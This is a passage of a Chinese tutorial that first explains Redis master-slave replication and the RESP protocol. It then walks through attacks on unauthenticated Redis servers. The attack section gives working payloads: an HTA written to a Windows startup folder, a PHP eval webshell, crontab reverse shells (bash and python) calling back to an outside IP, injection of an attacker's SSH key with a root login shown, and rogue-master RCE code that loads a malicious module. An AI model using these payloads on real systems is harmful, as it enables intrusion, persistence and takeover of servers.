#define REPL_STATE_TRANSFER 12 /* 正在从master接收RDB文件 */
```

当slave向master发送PSYNC命令之后，一般会得到三种回复，他们分别是：

```
- +FULLRESYNC：不好意思，需要全量复制哦。
- +CONTINUE：嘿嘿，可以进行增量同步。
- -ERR：不好意思，目前master还不支持PSYNC。
```

当slave和master确定好复制方案之后，slave注册一个读取RDB文件的I/O事件处理器，事件处理器为readSyncBulkPayload，然后将状态设置为REPL_STATE_TRANSFER，这基本就是syncWithMaster的实现。
- 处理PSYNC-全量复制
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t013321600b01e4b7c7.png)

全量复制过程：

```
# slave和master握手连接之后
1、Redis内部会发出一个同步命令，刚开始是Psync命令，Psync ? -1表示要求master主机同步数据
2、主机会向从机发送run_id和offset，因为slave并没有对应的offset，所以是全量复制（fullresync）
3、从机slave会保存主机master的基本信息
4、主节点收到全量复制的命令后，执行bgsave（异步执行），在后台生成RDB文件（快照），并使用一个缓冲区（称为复制缓冲区）记录从现在开始执行的所有写命令
5、主机发送RDB文件给从机
6、发送缓冲区数据
7、刷新旧的数据。从节点在载入主节点的数据之前要先将老数据清除
8、加载RDB文件将数据库状态更新至主节点执行bgsave时的数据库状态和缓冲区数据的加载。
```

全量复制开销：

```
主节点需要bgsave
RDB文件网络传输占用网络io
从节点要清空数据
从节点加载RDB
全量复制会触发从节点AOF重写
```

<a class="reference-link" name="%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6-%E9%83%A8%E5%88%86%E5%A4%8D%E5%88%B6"></a>**主从复制-部分复制**

部分复制是Redis 2.8以后出现的，用于处理在主从复制中因网络闪断等原因造成的数据丢失场景，当从节点再次连上主节点后，如果条件允许，主节点会补发丢失数据给从节点。因为补发的数据远远小于全量数据，可以有效避免全量复制的过高开销，需要注意的是，如果网络中断时间过长，造成主节点没有能够完整地保存中断期间执行的写命令，则无法进行部分复制，仍使用全量复制

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t010ddf8d92be97e61f.png)

部分复制过程：

```
1、如果网络抖动（连接断开 connection lost）
2、主机master 还是会写 repl_back_buffer（复制缓冲区）
3、从机slave 会继续尝试连接主机
4、从机slave 会把自己当前 run_id 和偏移量传输给主机 master，并且执行 pysnc 命令同步
5、如果master发现你的偏移量是在缓冲区的范围内，就会返回 continue命令
6、同步了offset的部分数据，所以部分复制的基础就是偏移量 offset。
```

run_id:

```
服务器运行ID(run_id)：每个Redis节点(无论主从)，在启动时都会自动生成一个随机ID(每次启动都不一样)，由40个随机的十六进制字符组成；run_id用来唯一识别一个Redis节点。通过info server命令，可以查看节点的run_id。
```

<a class="reference-link" name="%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E5%AE%9E%E4%BE%8B"></a>**主从复制实例**

下面启动两个docker容器演示基于redis数据库的主从复制

```
root@rose:~# docker run --name redis-5.0-master redis:5.0
root@rose:~# docker run --name redis-5.0-slave redis:5.0

root@rose:~# docker ps
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS               NAMES
f4e79ff861c9        redis:5.0           "docker-entrypoint.s…"   About an hour ago   Up About an hour    6379/tcp            redis-5.0-slave
30219689817c        redis:5.0           "docker-entrypoint.s…"   About an hour ago   Up About an hour    6379/tcp            redis-5.0-master
root@rose:~#
```

连接两个docker-&gt;redis

```
redis-5.0-master    172.17.0.2
redis-5.0-slave        172.17.0.3
```

```
root@rose:~# redis-cli -h 172.17.0.2 -p 6379
172.17.0.2:6379&gt;
172.17.0.2:6379&gt;
172.17.0.2:6379&gt;
172.17.0.2:6379&gt; info
# Server
redis_version:5.0.9
redis_git_sha1:00000000
、、、、、、
、、、、、、
172.17.0.2:6379&gt; config get slaveof
1) "slaveof"
2) ""
172.17.0.2:6379&gt;
```

```
root@rose:~# redis-cli -h 172.17.0.3 -p 6379
172.17.0.3:6379&gt; info
# Server
redis_version:5.0.9
redis_git_sha1:00000000
、、、、、、
、、、、、、
172.17.0.3:6379&gt; config get slaveof
1) "slaveof"
2) ""
172.17.0.3:6379&gt;
```

默认两个容器redis服务皆为主节点，设置容器一为`redis-5.0-master 172.17.0.2`主节点，容器二`redis-5.0-slave 172.17.0.3`为从节点

```
172.17.0.3:6379&gt; SLAVEOF 172.17.0.2 6379
OK
172.17.0.3:6379&gt; config get slaveof
1) "slaveof"
2) "172.17.0.2 6379"
172.17.0.3:6379&gt;
```

主从复制数据同步

```
root@rose:~# redis-cli -h 172.17.0.2 -p 6379
172.17.0.2:6379&gt; set qftm MaybeAHacker!
OK
172.17.0.2:6379&gt; get qftm
"MaybeAHacker!"
172.17.0.2:6379&gt; exit
root@rose:~# redis-cli -h 172.17.0.3 -p 6379
172.17.0.3:6379&gt; get qftm
"MaybeAHacker!"
172.17.0.3:6379&gt;
```

从节点主机只能读数据而不能写入数据（写入数据的责任由主节点主机提供）同时设置主从复制之后从节点主机原有数据会默认被擦除：`FLUSHALL`

```
172.17.0.3:6379&gt; set test 123
(error) READONLY You can't write against a read only replica.
172.17.0.3:6379&gt;

```

<a class="reference-link" name="%E6%A8%A1%E5%9D%97%E6%89%A9%E5%B1%95"></a>**模块扩展**

`MODULE LOAD`命令为redis加载外部的模块，该模块可以自定义。模块编写方法可以参考官方示例：[https://github.com/RedisLabs/RedisModulesSDK。](https://github.com/RedisLabs/RedisModulesSDK%E3%80%82)

在Reids 4.x之后，Redis新增了模块功能，暴露了必要的 API，并且有自动内存管理（大大减轻编写负担），基于 C99（C++ 或者其它语言的 C 绑定接口当然也可以），通过外部拓展，可以实现在redis中实现一个新的Redis命令。

客户端工具 redis-cli

```
module load /path/module.so [argv0] [argv1] # 客户端指令，加载模块

module list # 列出所有模块

module unload module # 卸载模块，模块名是函数中注册的名称，不是文件名
```

### <a class="reference-link" name="%E5%8D%8F%E8%AE%AE"></a>协议

在进行Redis操作讲解之前，一定要先了解一下Redis底层协议RESP。

> PS：RESP 虽然是为 Redis 设计的，但是同样也可以用于其他 C/S 的软件。

<a class="reference-link" name="RESP%E5%8D%8F%E8%AE%AE%E6%98%AF%E4%BB%80%E4%B9%88"></a>**RESP协议是什么**

[官方文档详解](https://redis.io/topics/protocol)

RESP(REdis Serialization Protocol)是基于TCP的应用层协议 ，底层采用的是TCP的连接方式，通过tcp进行数据传输，然后根据解析规则解析相应信息。

Redis 的客户端和服务端之间采取了一种独立名为 RESP(REdis Serialization Protocol) 的协议，作者主要考虑了以下几个点：

```
容易实现
解析快
人类可读
```

RESP协议是在Redis 1.2中引入的，但它成为了与Redis 2.0中的Redis服务器通信的标准方式。这是所有Redis客户端都要遵循的协议，我们甚至可以基于此协议，开发实现自己的Redis客户端。

**<a class="reference-link" name="RESP%E5%8D%8F%E8%AE%AE%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"></a>RESP协议数据类型**

RESP 主要可以序列化以下几种类型：整数，单行回复(简单字符串)，数组，错误信息，多行字符串。

Redis 客户端向服务端发送的是一组由执行的命令组成的字符串数组，服务端根据不同的命令回复不同类型的数据，但协议的每部分都是以`"\r\n" (CRLF)`结尾的。另外 RESP 是二进制安全的，不需要处理从一个进程到另一个进程的传输，因为它使用了前缀长度进行传输。

RESP在Redis中用作请求-响应协议的方式如下：

```
1、客户端将命令作为Bulk Strings的RESP数组发送到Redis服务器。
2、服务器根据命令实现回复一种RESP类型。
```

在 RESP 中, 一些数据的类型通过它的第一个字节进行判断：

```
单行回复：回复的第一个字节是 "+"
错误信息：回复的第一个字节是 "-"
整形数字：回复的第一个字节是 ":"
多行字符串：回复的第一个字节是 "$"
数组：回复的第一个字节是 "*"
```
- **单行回复：Simple Strings**
以 “+” 开头，以 “\r\n” 结尾的字符串形式。

```
+OK\r\n
```

客户端，显示的内容为除 “+” 和 CRLF 以外的内容，例如上面的内容，则返回 “OK”.

```
127.0.0.1:6379&gt; set qftm MaybeAHacker.
+OK\r\n  # 服务端实际返回
---
OK   # redis-cli 客户端显示
```

跟踪客户端与服务端通信的相应TCP数据流【数据流中所显示的结果：每个关键字符串后的`CRLF`已作用回车换行】

```
*3
$3
set
$4
qftm
$13
MaybeAHacker.
+OK
```
- **错误信息：Errors**
错误信息和单行回复很像，不过是把 “+” 替换成了 “-“。而这两者之间真正的区别是，错误信息会被客户端视为异常，并且组成错误类型的是错误消息本身。

```
-Error message\r\n
```

错误信息只在有错误发生的时候才会发送，比如数据类型错误，语法错误，或者命令不存在之类的。

```
127.0.0.1:6379&gt; 11
-ERR unknown command `11`, with args beginning with: \r\n  #服务端实际返回, 下同
---
(error) ERR unknown command `11`, with args beginning with: #redis-cli 客户端显示, 下同

127.0.0.1:6379&gt; set name qftm qftm
-ERR syntax error\r\n
---
(error) ERR syntax error
```

跟踪客户端与服务端通信的相应TCP数据流【数据流中所显示的结果：每个关键字符串后的`CRLF`已作用回车换行】

```
*1
$2
11
-ERR unknown command `11`, with args beginning with: 
*4
$3
set
$4
name
$4
qftm
$4
qftm
-ERR syntax error
```
- **整数：Integers**
这种类型只是使用以 “:” 作为前缀，以CRLF作为结尾的字符串来表示整数。

`For example ":0\r\n", or ":1000\r\n" are integer replies.`

很多命令都会返回整数回复，例如 `INCR` `LLEN` `DEL` `EXISTS`之类的命令。

```
127.0.0.1:6379&gt; LLEN info
:3\r\n  # 服务端实际返回, 下同
---
(integer) 3  # redis-cli 客户端显示, 下同

127.0.0.1:6379&gt; DEL info
:1\r\n
---
(integer) 1
```

跟踪客户端与服务端通信的相应TCP数据流【数据流中所显示的结果：每个关键字符串后的`CRLF`已作用回车换行】

```
*2
$4
LLEN
$4
info
:3
*2
$3
DEL
$4
info
:1
```
- **多行字符串：Bulk Strings**
`Bulk Strings` 翻译过来，是指批量、多行字符串，用于表示长度最大为512MB的单个二进制安全字符串。

多行字符串按以下方式编码：

```
以 "$" 开头, 后跟实际要发送的字节数，随后是 CRLF，然后是实际的字符串数据，最后以 CRLF 结束。
```

例如：我们要发送一个 “qftm.info” 的字符串，那它实际就被编码为 “$10\r\nqftm.info\r\n”。而如果一个要发送一个空字符串，则会编码为 “$0\r\n\r\n” 。某些情况下，当要表示不存在的值时候，则以 “$-1\r\n” 返回，这被叫做Null Bulk String，客户端显示则为`(nil)`。

```
127.0.0.1:6379&gt; set site qftm.info
+OK\r\n  # 服务端实际返回, 下同
---
OK   # redis-cli 客户端显示, 下同

127.0.0.1:6379&gt; get site
$10\r\nqftm.info\r\n
---
"qftm.info"

127.0.0.1:6379&gt; del site
:1\r\n
---
(integer) 1

127.0.0.1:6379&gt; get site
$-1\r\n
---
(nil)

127.0.0.1:6379&gt; set site ''
+OK\r\n
---
OK

127.0.0.1:6379&gt; get site
$0\r\n\r\n
---
""
```

跟踪客户端与服务端通信的相应TCP数据流【数据流中所显示的结果：每个关键字符串后的`CRLF`已作用回车换行】

```
*3
$3
set
$4
site
$9
qftm.info
+OK
*2
$3
get
$4
site
$9
qftm.info
*2
$3
del
$4
site
:1
*2
$3
get
$4
site
$-1
*3
$3
set
$4
site
$0

+OK
*2
$3
get
$4
site
$0
```
- **数组：Arrays**
数组类型可用于客户端向服务端发送命令，同样的当某些命令将元素结合返回给客户端的时候，也是使用数组类型作为回复类型的。它以 “*” 开头，后面跟着返回元素的个数，随后是 CRLF, 再然后就是数组中各元素自己的类型了。

```
127.0.0.1:6379&gt; set key value
+OK\r\n  # 服务端实际返回, 下同
---
OK   # redis-cli 客户端显示, 下同
```

跟踪客户端与服务端通信的相应TCP数据流【数据流中所显示的结果：每个关键字符串后的`CRLF`已作用回车换行】

```
*3
$3
set
$3
key
$5
value
+OK
```

客户端发送的请求数据如下

```
*3
$3
set
$3
key
$5
value
```

分析客户端请求的数据

```
第一行*3表示这条发给Redis server的命令是数组，数组有3个元素(其实就是SET、key、value这三个字符串)；
后面的6行数据，分别是对数组三个元素的表示，每个元素用两行；
数组第一个元素：$3 SET ，$3代表Bulk Strings字符串长度为3，内容是SET。
数组第二个元素：$3 key ，$3代表Bulk Strings字符串长度为3，key。
数组第三个元素：$5 value ，$5代表Bulk Strings字符串长度为5，内容是value。
```



## 安全

Redis各个版本一直以来默认配置文件启动的服务都没有设置访问认证密码，即可以未授权访问redis服务。

在 `Redis 3.2` 以前的版本中，默认情况下启动的服务会绑定在 `0.0.0.0:6379`，这样将会将 Redis 服务暴露到公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下可以利用 Redis 的相关方法，在 Redis 服务器上写入SSH公钥，进而可以使用对应私钥直接登录目标服务器，或者向目标服务器写入定时任务、自启动、webshell等特殊文件来获取服务器的相应权限。

但是对于`Redis 3.2`之后的版本自动绑定本地IP：`127.0.0.1`或者之前的版本自定义配置绑定本地IP：`127.0.0.1`这种情况下，外网用户是否就无法直接访问服务器利用未授权访问攻击呢，事实上这种操作默认绑定本地127.0.0.1是相对安全的，但是如果服务器存在相关SSRF或者XXE漏洞，那么就可以以服务器为跳板来未授权访问redis服务，构造相应恶意数据从而攻击redis服务拿到相应的服务器权限。

针对上述不同的利用场景也就出现了两类常见的攻击方式：公网Redis未授权(授权)攻击、内网Redis未授权(授权)攻击。

### <a class="reference-link" name="%E7%89%88%E6%9C%AC%E9%85%8D%E7%BD%AE%E5%8F%98%E8%BF%81"></a>版本配置变迁

下面整理了redis不同版本`1.0.0-6.0.0`默认配置文件中主要的关键项变化情况【最新版6.0.0】以助于不同情况下的安全分析。

各个版本下载地址以查看相应的默认配置文件：[download versions](http://download.redis.io/releases/)

```
################################## NETWORK #####################################
    1.0.0 - &lt; 3.2.0
# 服务主机（注释 #：默认未绑定，默认则是绑定：0.0.0.0任意接口IP）
# bind 127.0.0.1

    3.2.0 - 6.0.0
# 默认绑定127.0.0.1
bind 127.0.0.1      

# 新增：从3.2开始，redis增加了protected-mode, 即使注释掉bind那一行，远程连接redis仍然会报错。
# 保护模式是一层安全保护，以避免访问和利用Internet上打开的Redis实例(避免公网未授权访问)。
# 它会在这两种任一情况下存在的时候，对外部主机访问起作用：未指定bind、未指定密码
# 如果想外部主机可访问、但又想不设置密码，就需要将安全模式关闭
protected-mode yes    

    1.0.0 - 6.0.0
# 服务端口
port 6379

    1.0.0 - &lt; 2.6.0
＃客户端闲置N秒后关闭连接（0禁用）
timeout 300

    2.6.0 - 6.0.0
timeout 0


################################ SNAPSHOTTING  ################################
    1.0.0 - 6.0.0
＃转储数据库的文件名
dbfilename dump.rdb
＃工作目录
dir ./


################################# REPLICATION #################################
# 主从复制（注释 #：默认模式是主主机）
    1.0.0 - &lt; 5.0.0
# slaveof &lt;masterip&gt; &lt;masterport&gt;

    5.0.0 - 6.0.0（Redis开发者应用户需求更改slaveof，为slaveof提供别名replicaof）
# replicaof &lt;masterip&gt; &lt;masterport&gt;


################################## SECURITY ###################################
    1.0.0 - 6.0.0
# 服务访问密码（注释 #：默认空密码【若要配置授权访问，去除注释，requirepass后设置密码】）
# requirepass foobared

################################### CLIENTS ####################################
    1.0.0 - 6.0.0
# 设置同时连接的最大客户端数，一旦达到限制，Redis将关闭所有新发送的连接
# maxclients 10000

```

### <a class="reference-link" name="%E5%85%AC%E7%BD%91Redis%E6%9C%AA%E6%8E%88%E6%9D%83+%E5%B8%B8%E8%A7%84%E6%94%BB%E5%87%BB"></a>公网Redis未授权+常规攻击

通过上述版本变迁的概述可知，redis3.2之后默认绑定了本地IP地址并开启了保护模式也就导致了默认的redis无法远程接入，但是也有很多redis配置错误将其暴露在公网上，如：关闭保护模式、绑定远程IP、空密码等危险配置。

常见的redis攻击方式主要是写入恶意程序文件，redis数据库备份（类似快照备份）里面有其自己的格式存储信息（版本、key、value等信息），虽然数据库文件中有很多脏数据，但是像webshell、ssh key、crontab等文件都有一定的容错性，也就导致了可以写入这些文件来进行恶意利用达到一定的攻击目的。

<a class="reference-link" name="%E5%86%99%E5%85%A5%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF%E5%8A%A8"></a>**写入开机自启动**

在 Windows 系统中有一些特殊的目录，在这些目录下的文件在开机的时候都会被运行，即：自启动程序。
- 恶意脚本
```
&lt;SCRIPT Language="JScript"&gt;new ActiveXObject("WScript.Shell").run("calc.exe");&lt;/SCRIPT&gt;
```
- 自启动程序
把上述恶意JS执行 calc 命令的代码程序写到了如下类似自启动目录中

```
# win10系统管理员自启动目录
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp

# win7、win10等系统普通用户下自启动目录
# user:Administrator
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

# user:Qftm
C:\Users\Qftm\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

# user:root
C:\Users\root\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

当系统启动时进入特定用户就会随之运行自启动程序，从而执行攻击者的恶意代码。

这里需要注意不同的自启动目录所属权限，普通用户没有权限向`Administrators`自启动目录写入程序，一般都是相应用户写入相应的自启动目录下。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01d03d934ee6ad4db4.png)
- redis未授权写入自启动文件
公网未授权直接远程连接执行数据库操作命令，写入恶意自启动程序

```
flushall

set x '&lt;SCRIPT Language="JScript"&gt;new ActiveXObject("WScript.Shell").run("calc.exe");&lt;/SCRIPT&gt;'

config set dir 'C:\Users\root\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'

config set dbfilename exp.hta

save
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t014b7203ea01a6c481.png)

<a class="reference-link" name="%E5%86%99%E5%85%A5Webshell"></a>**写入Webshell**

环境：当目标机器存在Web应用服务器。

这种方法，只要知道 web 绝对路径并且有相应的权限就可以写 webshell 拿到服务器权限。

Redis可以通过`config`和`set`命令向固定路径的文件写入内容，这个功能被利用来向指定文件写入恶意内容，特别是当Redis以`root`或`www-data`权限运行的情况下。
- 组合payload写入Webshell
```
flushall
set x '&lt;?php eval($_GET["Q"]);?&gt;'
config set dir /var/www/html/upload
config set dbfilename test.php
save
```
- 攻击效果
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01ac83914fad64b842.png)

PS：这里注意`flushall`危险操作，会清空所有缓存数据。

真实环境中肯定不能这样做直接清空数据库缓存数据，为了避免这种情况最好的手段是切换数据库，默认情况下redis有16个数据库默认连接选择的是第一个数据库，这个时候可以选择切换数据库避免`flushall`危险操作，同时对于`keys *`操作也尽量避免，当缓存数据很大的时候很容易造成环境崩溃。
- 指令替换思想
```
flushall---》切换数据库
keys *---》dbsize
```
- 效果
```
192.33.6.129:6379&gt; config get databases
1) "databases"
2) "16"
192.33.6.129:6379&gt; select 10
OK
192.33.6.129:6379[10]&gt; set Q testing
OK
192.33.6.129:6379[10]&gt; del Q
(integer) 1
192.33.6.129:6379[10]&gt; DBSIZE
(integer) 0
192.33.6.129:6379[10]&gt; SELECT 0
OK
192.33.6.129:6379&gt;
```

<a class="reference-link" name="%E5%86%99%E5%85%A5%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9Shell"></a>**写入定时任务反弹Shell**

环境：当目标机器不存在Web应用服务器，也就是Redis与Web服务器分离。

这种利用方法有点鸡肋，通常只能在`CentOS`下利用成功，`Ubuntu`却不可以。因为默认Redis写文件后，默认数据库备份文件是644的权限

```
root@rose:~# ls /var/lib/redis/dump.rdb -al
-rw-r--r-- 1 redis redis 92 Aug  6 10:00 /var/lib/redis/dump.rdb
root@rose:~#
```

但是ubuntu要求执行定时任务文件权限必须是600，同时，其对定时文件里面的数据格式要求很严格，不然就不会正常执行定时任务。

然而`CentOS`的定时任务执行文件在目录`/var/spool/cron/`下权限为644则可以成功执行定时任务，即使数据格式不严谨。【经测试：对于目录文件`/etc/crontab`不会生效】
- 组合payload反弹shell
```
# bash反弹
config set dir /var/spool/cron/
config set dbfilename root
set x '\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.33.6.129/9999 0&gt;&amp;1\n\n'
save

config set dir /var/spool/cron/
config set dbfilename root
set x '\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.33.6.129/9999 0&gt;&amp;1\n\n'
save

# python反弹
config set dir /var/spool/cron/
config set dbfilename root
set x "\n\n*/1 * * * * /usr/bin/python -c 'import socket,subprocess,os,sys;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.33.6.129\",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n"
save
```
- 定时任务执行情况
```
crontab -l

tail -f /var/log/cron
```
- 攻击效果：监听
```
root@rose:~# nc -lvp 9999
Listening on [0.0.0.0] (family 0, port 9999)
Connection from 192.33.6.144 40952 received!
```

PS：写入定时任务这种情况最好放到最后的方法中（对环境有一定的要求！）

<a class="reference-link" name="%E5%86%99%E5%85%A5SSH%E5%85%AC%E9%92%A5%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95"></a>**写入SSH公钥免密登录**

环境：当目标机器不存在Web应用服务器，也就是Redis与Web服务器分离。

对于Linux系统来说，使用ssh的用户目录下都会有一个隐藏文件夹`~/.ssh/`，只要我们可以将自己的公钥写在对方的`.ssh/authorized_keys`文件里，那么就可以直接ssh免密登录目标机器。

如果真实环境中Redis是以root权限运行的，并且`/root/.ssh/`目录存在，那么则可以尝试写入`/root/.ssh/authorized_keys`文件来获取目标机器所属权限。

具体操作如下及步骤：
- 生成恶意公钥
```
root@rose:~# ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa):
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /root/.ssh/id_rsa.
Your public key has been saved in /root/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:DnZea6Npe0X0T6/kxM8T/nkGy0B6SyKSwv0aKNqDbN0 root@rose
The key's randomart image is:
+---[RSA 2048]----+
|                 |
|            .    |
|           . .   |
|            o . .|
|   . .o.S .+ . o.|
|    oo+=..o.= =.o|
|..o o..oo.+= B.*.|
|.=.o E .o+... =o*|
|o ..  .o+o     o=|
+----[SHA256]-----+
root@rose:~#
root@rose:~#
root@rose:~# ls -al /root/.ssh/
total 16
drwx------ 2 root root 4096 Aug  9 15:23 .
drwx------ 8 root root 4096 Aug  9 13:31 ..
-rw------- 1 root root    0 Feb 25 01:35 authorized_keys
-rw------- 1 root root 1675 Aug  9 15:23 id_rsa
-rw-r--r-- 1 root root  391 Aug  9 15:23 id_rsa.pub
root@rose:~# cd /root/.ssh/
root@rose:~/.ssh# cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHStzQa4aESwm/Rm/caKPQAblnb6OBCpxpCeahB2WKwnwoT6DuZ1ypzgYTjMEP6BOhySnSatDpdn7wZKUL7ZEaJdSAd0qD/QaHHLFMYvNXrGJQC+9JBvt5X5iUJOx5Ukdu36YXxRib4cw2qhDLnKa2Q96pEInVJcZ02VNxHTvAE+vjhCTQSYPJahin/s/a+IYEcjqyvkiuWVDWg2GMViMwq5Yh/ELZG2KAXNpSNx1TjklXYQVPO2dmPCdUYyy1r+WxEjWLJZPPWQntQc6KiqHmkEGBXGB4fVxScCVR8y2/DEzEqsQcveFWw7mhqfp9kNHP+AOv0wFwL9G8/glZEnGB root@rose
root@rose:~/.ssh#
```
- 写入恶意SSH公钥
```
config set dir /root/.ssh/
config set dbfilename authorized_keys
set x "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHStzQa4aESwm/Rm/caKPQAblnb6OBCpxpCeahB2WKwnwoT6DuZ1ypzgYTjMEP6BOhySnSatDpdn7wZKUL7ZEaJdSAd0qD/QaHHLFMYvNXrGJQC+9JBvt5X5iUJOx5Ukdu36YXxRib4cw2qhDLnKa2Q96pEInVJcZ02VNxHTvAE+vjhCTQSYPJahin/s/a+IYEcjqyvkiuWVDWg2GMViMwq5Yh/ELZG2KAXNpSNx1TjklXYQVPO2dmPCdUYyy1r+WxEjWLJZPPWQntQc6KiqHmkEGBXGB4fVxScCVR8y2/DEzEqsQcveFWw7mhqfp9kNHP+AOv0wFwL9G8/glZEnGB root@rose\n\n"
save
```
- 查看受害机写入情况
```
[root@localhost .ssh]# cat authorized_keys
REDIS0006▒xA▒

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHStzQa4aESwm/Rm/caKPQAblnb6OBCpxpCeahB2WKwnwoT6DuZ1ypzgYTjMEP6BOhySnSatDpdn7wZKUL7ZEaJdSAd0qD/QaHHLFMYvNXrGJQC+9JBvt5X5iUJOx5Ukdu36YXxRib4cw2qhDLnKa2Q96pEInVJcZ02VNxHTvAE+vjhCTQSYPJahin/s/a+IYEcjqyvkiuWVDWg2GMViMwq5Yh/ELZG2KAXNpSNx1TjklXYQVPO2dmPCdUYyy1r+WxEjWLJZPPWQntQc6KiqHmkEGBXGB4fVxScCVR8y2/DEzEqsQcveFWw7mhqfp9kNHP+AOv0wFwL9G8/glZEnGB root@rose

▒▒9q▒Y▒Y[root@localhost .ssh]#
```
- 攻击效果：私钥登录
```
root@rose:~# ssh root@192.33.6.144
Last login: Sun Aug  9 23:58:12 2020 from 192.33.6.129
[root@localhost ~]# id
uid=0(root) gid=0(root) groups=0(root)
[root@localhost ~]# uname -a
Linux localhost.localdomain 3.10.0-957.el7.x86_64 #1 SMP Thu Nov 8 23:39:32 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
[root@localhost ~]# exit
logout
Connection to 192.33.6.144 closed.
root@rose:~#
```

### <a class="reference-link" name="%E5%85%AC%E7%BD%91Redis%E6%9C%AA%E6%8E%88%E6%9D%83+%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6RCE"></a>公网Redis未授权+主从复制RCE

以往我们想给 Redis 加个功能或类似事务的东西只能用 Lua 脚本，这个东西没有实现真正的原子性，另外也无法使用底层的 API。

在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。

Redis模块是动态库，可以在启动时或使用`MODULE LOAD`命令加载到Redis中，那么就可以考虑是否可以向redis服务主机注入恶意so文件并加载执行恶意命令。

有关主从复制RCE：最早由LCBC战队队员Pavel Toporkov在zeronights 2018上介绍的redis 4.x RCE攻击 [15-redis-post-exploitation](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf)。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t012bcff574f60d9d02.png)
- 漏洞原理
通过模拟恶意主机作为主节点，在目标机上设置主从复制，然后模拟`FULLRESYNC`执行全量复制操作，将恶意主机上的恶意so文件同步到目标主机并加载以执行系统恶意命令。
- 漏洞利用工具
已公开的比较好用的利用工具：

```
https://github.com/Ridter/redis-rce
https://github.com/n0b0dyCN/redis-rogue-server
https://github.com/LoRexxar/redis-rogue-server
```

[@LoRexxar](https://github.com/LoRexxar)师傅项目中核心利用代码：

```
def handle(self, data):
        resp = ""
        phase = 0
        if "PING" in data:
            resp = "+PONG" + CLRF
            phase = 1
        elif "REPLCONF" in data:
            resp = "+OK" + CLRF
            phase = 2
        elif "PSYNC" in data or "SYNC" in data:
            resp = "+FULLRESYNC " + "Z"*40 + " 1" + CLRF
            resp += "$" + str(len(payload)) + CLRF
            resp = resp.encode()
            resp += payload + CLRF.encode()
            phase = 3
        return resp, phase

    def exp(self):
        cli, addr = self._sock.accept()
        while True:
            data = din(cli, 1024)
            if len(data) == 0:
                break
            resp, phase = self.handle(data)
            dout(cli, resp)
            if phase == 3:
                break

    def runserver(rhost, rport, lhost, lport):
        # expolit
        remote = Remote(rhost, rport)
        remote.do(f"SLAVEOF `{`lhost`}` `{`lport`}`")
        remote.do("CONFIG SET dbfilename exp.so")
        sleep(2)
        rogue = RogueServer(lhost, lport)
        rogue.exp()
        sleep(2)
        remote.do("MODULE LOAD ./exp.so")
